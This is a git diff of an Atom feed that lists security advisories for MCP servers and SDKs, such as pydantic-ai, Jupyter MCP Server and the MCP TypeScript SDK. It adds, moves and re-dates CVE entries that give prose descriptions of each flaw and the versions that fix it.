@@ -5,15 +5,100 @@
   <id>https://github.com/JMartynov/mcp-vulnerabilities/feed.atom</id>
   <link rel="self" href="https://github.com/JMartynov/mcp-vulnerabilities/raw/main/data/feed.atom" />
   <link rel="alternate" href="https://github.com/JMartynov/mcp-vulnerabilities" />
-  <updated>2026-11-18T23:17:21.930Z</updated>
+  <updated>2026-11-20T08:18:33.637Z</updated>
   <author>
     <name>MCP Security Community</name>
   </author>
   <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-133505</id>
+    <title>[MEDIUM] CVE-2026-133505: When message history is serialized and loaded again, a tool result that contains a JSON object in the serialized shape o</title>
+    <link rel="alternate" href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-4cj4-hgwf-4hc4" />
+    <updated>2026-11-20T08:18:33.637Z</updated>
+    <published>2026-11-20T08:18:33.637Z</published>
+    <summary>When message history is serialized and loaded again, a tool result that contains a JSON object in the serialized shape o</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-133505&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; MEDIUM (CVSS 5.9)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; pydantic-ai, pydantic-ai-slim&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;When message history is serialized and loaded again, a tool result that contains a JSON object in the serialized shape of one of Pydantic AI's file types is rebuilt as that file. A third party who controls data a tool returns, such as a record that an MCP server or a function tool returns from an external system, can use this to make the application download a URL on its local network, or make the model provider read an s3:// object or uploaded file with the application's credentials. Applications are affected when tool results can contain third-party data, message history containing those results is serialized and loaded again (stored history, history a UI adapter holds on the server, or Temporal, DBOS or Prefect durable execution), and the model is one Pydantic AI downloads files for, one that honors force_download, or one whose provider resolves non-HTTP file URLs or uploaded files. History that a client submits through the Vercel AI or AG-UI adapter in the default mode is not affected. The issue is fixed in pydantic-ai and pydantic-ai-slim 1.107.10 and 2.66.0.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-4cj4-hgwf-4hc4"&gt;https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-4cj4-hgwf-4hc4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://pydantic.dev/docs/ai/ui/overview#trust-model-for-client-submitted-messages"&gt;https://pydantic.dev/docs/ai/ui/overview#trust-model-for-client-submitted-messages&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-77359</id>
+    <title>[CRITICAL] CVE-2026-77359: Jupyter MCP Server is a Model Context Protocol server for Jupyter. Prior to 1.0.3, standalone streamable-http mode valid</title>
+    <link rel="alternate" href="https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4" />
+    <updated>2026-11-19T20:17:54.220Z</updated>
+    <published>2026-11-19T17:18:59.520Z</published>
+    <summary>Jupyter MCP Server is a Model Context Protocol server for Jupyter. Prior to 1.0.3, standalone streamable-http mode valid</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-77359&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; CRITICAL&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; unknown&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;Jupyter MCP Server is a Model Context Protocol server for Jupyter. Prior to 1.0.3, standalone streamable-http mode validates Host and Origin values for /mcp but does not apply the same browser-origin controls to the state-changing /api/connect and /api/stop management routes. A malicious website can use DNS rebinding so that its hostname resolves to a loopback, LAN, VPN, or published-container MCP listener, then send a browser-shaped request that /api/connect accepts to replace runtime_url and document_url values and start a kernel client against attacker-controlled infrastructure. The attacker can thereby cause Jupyter API and WebSocket traffic to reach that infrastructure and can use /api/stop to stop the current notebook kernel. The default broad bind can increase exposure, but the vulnerability is the missing management-route origin boundary, not a lack of Host validation on /mcp. This issue is fixed in version 1.0.3.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4"&gt;https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/datalayer/jupyter-mcp-server/pull/262"&gt;https://github.com/datalayer/jupyter-mcp-server/pull/262&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/datalayer/jupyter-mcp-server/releases/tag/v1.0.3"&gt;https://github.com/datalayer/jupyter-mcp-server/releases/tag/v1.0.3&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/datalayer/jupyter-mcp-server/security/advisories/GHSA-9x8x-crjq-g64h"&gt;https://github.com/datalayer/jupyter-mcp-server/security/advisories/GHSA-9x8x-crjq-g64h&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-77318</id>
+    <title>[HIGH] CVE-2026-77318: Jupyter MCP Server is a Model Context Protocol server for Jupyter. Prior to 1.0.3, standalone streamable-http mode can e</title>
+    <link rel="alternate" href="https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4d246fc5" />
+    <updated>2026-11-19T19:17:32.883Z</updated>
+    <published>2026-11-19T17:18:59.027Z</published>
+    <summary>Jupyter MCP Server is a Model Context Protocol server for Jupyter. Prior to 1.0.3, standalone streamable-http mode can e</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-77318&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; HIGH&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; unknown&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;Jupyter MCP Server is a Model Context Protocol server for Jupyter. Prior to 1.0.3, standalone streamable-http mode can enforce MCP_TOKEN on /mcp while leaving the state-changing /api/connect and /api/stop management routes unauthenticated. An unauthenticated network caller can use /api/connect to replace runtime_url and document_url values and their tokens, reset ServerContext, and start a kernel client against attacker-controlled infrastructure, causing the server to send Jupyter API and WebSocket traffic to that backend. The caller can also use /api/stop to stop the current notebook kernel. This boundary failure does not require explicit insecure no-auth mode and occurs outside normal MCP JSON-RPC tool dispatch. This issue is fixed in version 1.0.3.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4d246fc5"&gt;https://github.com/datalayer/jupyter-mcp-server/commit/c2e98fca2df1bbd608451ec416aaa38a4d246fc5&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/datalayer/jupyter-mcp-server/pull/262"&gt;https://github.com/datalayer/jupyter-mcp-server/pull/262&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/datalayer/jupyter-mcp-server/releases/tag/v1.0.3"&gt;https://github.com/datalayer/jupyter-mcp-server/releases/tag/v1.0.3&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/datalayer/jupyter-mcp-server/security/advisories/GHSA-24pw-rf5p-mgp7"&gt;https://github.com/datalayer/jupyter-mcp-server/security/advisories/GHSA-24pw-rf5p-mgp7&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-133161</id>
+    <title>[HIGH] CVE-2026-133161: ### Summary ui
+
+With `strip_ansi=True`, Pydantic AI Harness's `ToolOutputLimits` capability removes ANSI escape sequence</title>
+    <link rel="alternate" href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-m4cr-m4qc-9hh3" />
+    <updated>2026-11-19T15:17:35.953Z</updated>
+    <published>2026-11-19T15:17:35.953Z</published>
+    <summary>### Summary ui
+
+With `strip_ansi=True`, Pydantic AI Harness's `ToolOutputLimits` capability removes ANSI escape sequence</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-133161&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; HIGH (CVSS 7.5)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; pydantic-ai-harness&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;### Summary ui
+
+With `strip_ansi=True`, Pydantic AI Harness's `ToolOutputLimits` capability removes ANSI escape sequences from tool output with a pattern that takes time quadratic in the length of a line. A tool result of a few hundred kilobytes, crafted with many unterminated escape sequences, can occupy the event loop for tens of seconds to minutes, delaying every other request and agent run in the process.
+
+### Details
+
+This affects applications that set `strip_ansi=True` on `ToolOutputLimits` (named `OverflowingToolOutput` before 0.13.0) and run tools whose output an attacker can influence, such as shell commands, file reads, fetched pages or MCP servers. Stripping runs on the event loop before the capability reduces the output, so its own size limits do not bound it.
+
+The assumed attacker can place text in content a tool returns.
+
+### Mitigation
+
+Upgrade `pydantic-ai-harness` to 0.70.0 or later. Until then, leave `strip_ansi` at its default, `False`.
+
+On Pydantic AI v1, the harness cannot be upgraded past 0.4.0. Upgrade to Pydantic AI v2 and `pydantic-ai-harness` 0.70.0, or leave `strip_ansi` off.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-m4cr-m4qc-9hh3"&gt;https://github.com/pydantic/pydantic-ai/security/advisories/GHSA-m4cr-m4qc-9hh3&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
     <id>urn:mcp:vulnerability:CVE-2026-77283</id>
     <title>[HIGH] CVE-2026-77283: obsidian-sync-mcp is an MCP server that gives AI agents access to Obsidian vaults. Prior to 0.5.7, deployments running w</title>
     <link rel="alternate" href="https://github.com/es617/obsidian-sync-mcp/commit/d4d2cbbb02ffadaecf1d6252902b8d08610c7018" />
-    <updated>2026-11-18T23:17:21.930Z</updated>
+    <updated>2026-11-19T19:17:32.753Z</updated>
     <published>2026-11-18T23:17:21.930Z</published>
     <summary>obsidian-sync-mcp is an MCP server that gives AI agents access to Obsidian vaults. Prior to 0.5.7, deployments running w</summary>
     <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-77283&lt;/p&gt;
@@ -47,7 +132,7 @@
     <id>urn:mcp:vulnerability:CVE-2026-75518</id>
     <title>[MEDIUM] CVE-2026-75518: DOMShell is a Chrome automation project whose MCP server exposes Unix-style tools for AI agents. Prior to 2.0.8, the DOM</title>
     <link rel="alternate" href="https://github.com/apireno/DOMShell/commit/03c1d7625e220297aff0dde37613d65cfe6f9a36" />
-    <updated>2026-11-18T22:17:24.147Z</updated>
+    <updated>2026-11-19T16:21:54.763Z</updated>
     <published>2026-11-18T22:17:24.147Z</published>
     <summary>DOMShell is a Chrome automation project whose MCP server exposes Unix-style tools for AI agents. Prior to 2.0.8, the DOM</summary>
     <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-75518&lt;/p&gt;
@@ -100,7 +185,7 @@
     <id>urn:mcp:vulnerability:CVE-2026-130768</id>
     <title>[MEDIUM] CVE-2026-130768: Obot from 0.14.0 before 0.27.0 contains a server-side request forgery vulnerability that allows Power Users to bypass ou</title>
     <link rel="alternate" href="https://github.com/obot-platform/obot/security/advisories/GHSA-r3m3-5rmh-h3fm" />
-    <updated>2026-11-18T19:17:49.207Z</updated>
+    <updated>2026-11-19T16:19:58.220Z</updated>
     <published>2026-11-18T19:17:48.850Z</published>
     <summary>Obot from 0.14.0 before 0.27.0 contains a server-side request forgery vulnerability that allows Power Users to bypass ou</summary>
     <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-130768&lt;/p&gt;
@@ -115,7 +200,7 @@
     <id>urn:mcp:vulnerability:CVE-2026-130767</id>
     <title>[MEDIUM] CVE-2026-130767: Obot from 0.9.0 before 0.27.0 contains a command injection vulnerability that allows authenticated users to execute shel</title>
     <link rel="alternate" href="https://github.com/obot-platform/obot/security/advisories/GHSA-2mfp-9vv3-q737" />
-    <updated>2026-11-18T19:17:48.690Z</updated>
+    <updated>2026-11-19T15:17:30.727Z</updated>
     <published>2026-11-18T19:17:48.467Z</published>
     <summary>Obot from 0.9.0 before 0.27.0 contains a command injection vulnerability that allows authenticated users to execute shel</summary>
     <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-130767&lt;/p&gt;
@@ -145,7 +230,7 @@
     <id>urn:mcp:vulnerability:CVE-2026-130764</id>
     <title>[HIGH] CVE-2026-130764: Obot from 0.8.0 before 0.27.0 contains a server-side request forgery vulnerability that allows Power User accounts to re</title>
     <link rel="alternate" href="https://github.com/obot-platform/obot/security/advisories/GHSA-57qx-69p6-3w3g" />
-    <updated>2026-11-18T19:17:47.743Z</updated>
+    <updated>2026-11-19T16:19:57.190Z</updated>
     <published>2026-11-18T19:17:47.600Z</published>
     <summary>Obot from 0.8.0 before 0.27.0 contains a server-side request forgery vulnerability that allows Power User accounts to re</summary>
     <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-130764&lt;/p&gt;
@@ -160,7 +245,7 @@
     <id>urn:mcp:vulnerability:CVE-2026-132121</id>
     <title>[HIGH] CVE-2026-132121: Supergateway 2.4.0 through 4.2.2 contains a cross-site WebSocket hijacking vulnerability in stdio-to-WebSocket mode that</title>
     <link rel="alternate" href="https://github.com/Teycir/supergateway-security-research" />
-    <updated>2026-11-18T13:17:27.317Z</updated>
+    <updated>2026-11-19T17:18:02.627Z</updated>
     <published>2026-11-18T13:17:27.317Z</published>
     <summary>Supergateway 2.4.0 through 4.2.2 contains a cross-site WebSocket hijacking vulnerability in stdio-to-WebSocket mode that</summary>
     <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-132121&lt;/p&gt;
@@ -644,60 +729,6 @@ AI assistance was used while investigating. The traversal was reproduced against
 &lt;li&gt;&lt;a href="https://github.com/evalstate/fast-agent/pull/828"&gt;https://github.com/evalstate/fast-agent/pull/828&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/evalstate/fast-agent/releases/tag/v0.7.21"&gt;https://github.com/evalstate/fast-agent/releases/tag/v0.7.21&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="https://github.com/evalstate/fast-agent/security/advisories/GHSA-9vhv-g5hf-m7m7"&gt;https://github.com/evalstate/fast-agent/security/advisories/GHSA-9vhv-g5hf-m7m7&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <id>urn:mcp:vulnerability:CVE-2026-111770</id>
-    <title>[HIGH] CVE-2026-111770: The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Pro</title>
-    <link rel="alternate" href="https://github.com/modelcontextprotocol/typescript-sdk/commit/84804c22e45a662675a198f853b7f00063838a8d" />
-    <updated>2026-11-12T20:04:52.377Z</updated>
-    <published>2026-11-05T22:17:45.817Z</published>
-    <summary>The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Pro</summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111770&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; HIGH (CVSS 7.7)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; unknown&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Protocol. From 2.0.0 until 2.3.0 in @modelcontextprotocol/server, applications that shared one stateless HTTP transport or one McpServer or Server instance among multiple clients could deliver responses and notifications to the wrong client. The affected surface is an MCP server reached over HTTP by multiple clients. The trigger is reuse of one stateless transport or server instance. Messages were associated with a connection using only the JSON-RPC request identifier. SDK clients start request identifiers at zero, so collisions occur in normal operation. Cross-client delivery exposes one client's responses and notifications to another client. The issue requires an HTTP endpoint reachable by more than one client and an application that constructs the server or transport once at startup instead of once per request or session. stdio servers and factory-created per-call servers are not affected. Upgrading causes reused instances to fail and therefore requires an application code change. This issue is fixed in @modelcontextprotocol/server 2.3.0.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/84804c22e45a662675a198f853b7f00063838a8d"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/84804c22e45a662675a198f853b7f00063838a8d&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2918"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2918&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/1.32.0"&gt;https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/1.32.0&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/@modelcontextprotocol/server@2.3.0"&gt;https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/@modelcontextprotocol/server@2.3.0&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <id>urn:mcp:vulnerability:CVE-2026-111769</id>
-    <title>[MEDIUM] CVE-2026-111769: The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Pro</title>
-    <link rel="alternate" href="https://github.com/modelcontextprotocol/typescript-sdk/commit/30bfe5139f4b0825c90cd725f9a7e3f9af5e120d" />
-    <updated>2026-11-12T22:18:51.470Z</updated>
-    <published>2026-11-05T22:17:45.637Z</published>
-    <summary>The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Pro</summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111769&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; MEDIUM (CVSS 6.5)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; unknown&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Protocol. Prior to 1.32.0 in @modelcontextprotocol/sdk and from 2.0.0 until 2.3.0 in @modelcontextprotocol/client, the HTTP client transports and OAuth client requests followed redirects to a different origin while retaining custom request headers and, for HTTP 307 or 308 responses, request bodies. The affected surfaces are StreamableHTTPClientTransport, SSEClientTransport, and OAuth client functions such as auth(). The trigger is an HTTP redirect to another origin. Custom headers and mcp-session-id can be re-sent to the redirected origin. HTTP 307 and 308 redirects can also re-send the request body. OAuth request bodies can contain refresh_token and client_secret values. Current runtimes already strip the Authorization header across origins. stdio clients do not use the affected HTTP path. A malicious or compromised MCP or authorization server could therefore receive API keys, session identifiers, OAuth refresh tokens, or OAuth client secrets. Restoring unrestricted redirect following after upgrading restores the exposure. This issue is fixed in @modelcontextprotocol/sdk 1.32.0 and @modelcontextprotocol/client 2.3.0.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/30bfe5139f4b0825c90cd725f9a7e3f9af5e120d"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/30bfe5139f4b0825c90cd725f9a7e3f9af5e120d&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/433eb413dc305ebeb93b8ebcde0095a8fc0d5fa0"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/433eb413dc305ebeb93b8ebcde0095a8fc0d5fa0&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2901"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2901&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2902"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2902&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
-    <id>urn:mcp:vulnerability:CVE-2026-111771</id>
-    <title>[MEDIUM] CVE-2026-111771: The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Pro</title>
-    <link rel="alternate" href="https://github.com/modelcontextprotocol/typescript-sdk/commit/40f8f4e229d963cd7fd2890bda2aeebe7005299a" />
-    <updated>2026-11-12T22:18:51.470Z</updated>
-    <published>2026-11-05T21:18:35.973Z</published>
-    <summary>The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Pro</summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111771&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; MEDIUM (CVSS 6.8)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; unknown&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;The Model Context Protocol TypeScript SDK provides TypeScript client and server implementations of the Model Context Protocol. From 1.6.0 until 1.32.0 in @modelcontextprotocol/sdk, from 2.0.0 until 2.3.0 in @modelcontextprotocol/server, from 2.0.0 until 2.0.2 in @modelcontextprotocol/express, and from 2.0.0 until 2.3.1 in @modelcontextprotocol/server-legacy, server-side bearer authentication could accept a valid access token issued for a different service because the SDK did not enforce the token audience. The affected surface is server-side HTTP bearer authentication. The trigger is a valid token whose audience names another service. The authorization server must issue tokens for multiple services, and the application's verifyAccessToken() must not independently validate aud. Applications already validating aud inside verifyAccessToken() are not affected. An attacker with a token for another service could authenticate to the MCP server and obtain the confidentiality and integrity capabilities granted to an authenticated caller. Upgrading alone leaves the new audience validation disabled. Operators must enable audience validation and provide the token audience together. Enabling only the expected audience check causes every request to receive HTTP 401. This issue is fixed in @modelcontextprotocol/sdk 1.32.0, @modelcontextprotocol/server 2.3.0, @modelcontextprotocol/express 2.0.2, and @modelcontextprotocol/server-legacy 2.3.1.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/40f8f4e229d963cd7fd2890bda2aeebe7005299a"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/40f8f4e229d963cd7fd2890bda2aeebe7005299a&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/5a0724d14cf34a27a3b070224d2996cdd611df9f"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/5a0724d14cf34a27a3b070224d2996cdd611df9f&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/5a1867390b91b8836f49af76c45427279f513325"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/5a1867390b91b8836f49af76c45427279f513325&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2929"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2929&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
@@ -1188,23 +1219,6 @@ AWS fixed this issue service-side. No customer action is required.&lt;/p&gt;
 &lt;/ul&gt;&lt;/p&gt;</content>
   </entry>
   <entry>
-    <id>urn:mcp:vulnerability:CVE-2026-111767</id>
-    <title>[HIGH] CVE-2026-111767: MCP TypeScript SDK is the official TypeScript SDK for Model Context Protocol servers and clients. From version 1.24.0 to</title>
-    <link rel="alternate" href="https://github.com/modelcontextprotocol/typescript-sdk/commit/727075b5bbeb77fbea22041b36b72a73042160fa" />
-    <updated>2026-10-20T19:53:10.247Z</updated>
-    <published>2026-10-20T19:17:30.847Z</published>
-    <summary>MCP TypeScript SDK is the official TypeScript SDK for Model Context Protocol servers and clients. From version 1.24.0 to</summary>
-    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111767&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; HIGH (CVSS 8.6)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; unknown&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;MCP TypeScript SDK is the official TypeScript SDK for Model Context Protocol servers and clients. From version 1.24.0 to before version 1.32.0, the experimental tasks feature (taskStore) did not check which session created a task. Clients sharing one InMemoryTaskStore could list, read and cancel each other's tasks. This issue has been patched in version 1.32.0.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/727075b5bbeb77fbea22041b36b72a73042160fa"&gt;https://github.com/modelcontextprotocol/typescript-sdk/commit/727075b5bbeb77fbea22041b36b72a73042160fa&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/pull/2925"&gt;https://github.com/modelcontextprotocol/typescript-sdk/pull/2925&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-22jm-h49p-29qw"&gt;https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-22jm-h49p-29qw&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;/p&gt;</content>
-  </entry>
-  <entry>
     <id>urn:mcp:vulnerability:CVE-2026-113378</id>
     <title>[MEDIUM] CVE-2026-113378: A security flaw has been discovered in mcollina mcp-ripgrep up to 0.4.0. Affected is an unknown function of the file src</title>
     <link rel="alternate" href="https://gist.github.com/sandh0t/45fdee24a7907e0cd836aed26f2d5a7a" />
@@ -1235,6 +1249,106 @@ AWS fixed this issue service-side. No customer action is required.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Details:&lt;/strong&gt;&lt;br&gt;IBM ContextForge MCP Gateway 0.1.0 through 1.0.5 is vulnerable to a server-side request Forgery (SSRF) that allows authenticated users with gateway creation privileges to perform arbitrary HTTP POST requests to internal network resources and cloud metadata endpoints. The vulnerability occurs during OAuth-enabled gateway registration when the system fails to validate the oauth_config.token_url parameter. When registering a gateway with OAuth client credentials authentication, an attacker can supply a malicious token_url pointing to internal services, cloud metadata endpoints (AWS IMDSv1, GCP, Azure), or localhost-bound services. The application immediately performs an HTTP POST request to the attacker-controlled URL with form-encoded credentials in the body. If the response cannot be parsed as a valid OAuth token response, up to 256 characters of the response body are reflected back to the attacker in the HTTP 502 error message. This vulnerability bypasses existing SSRF protections that are applied to the gateway.url field but not to OAuth configuration parameters.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;ul&gt;
 &lt;li&gt;&lt;a href="https://www.ibm.com/support/pages/node/7285723"&gt;https://www.ibm.com/support/pages/node/7285723&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <id>urn:mcp:vulnerability:CVE-2026-111767</id>
+    <title>[HIGH] CVE-2026-111767: MCP TypeScript SDK: Experimental tasks were not tied to the session that created them</title>
+    <link rel="alternate" href="https://github.com/advisories/GHSA-22jm-h49p-29qw" />
+    <updated>2026-10-20T00:00:00Z</updated>
+    <published>2026-10-20T00:00:00Z</published>
+    <summary>MCP TypeScript SDK: Experimental tasks were not tied to the session that created them</summary>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Vulnerability ID:&lt;/strong&gt; CVE-2026-111767&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; HIGH (CVSS 8.6)&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Affected Package(s):&lt;/strong&gt; @modelcontextprotocol/sdk&lt;/p&gt;
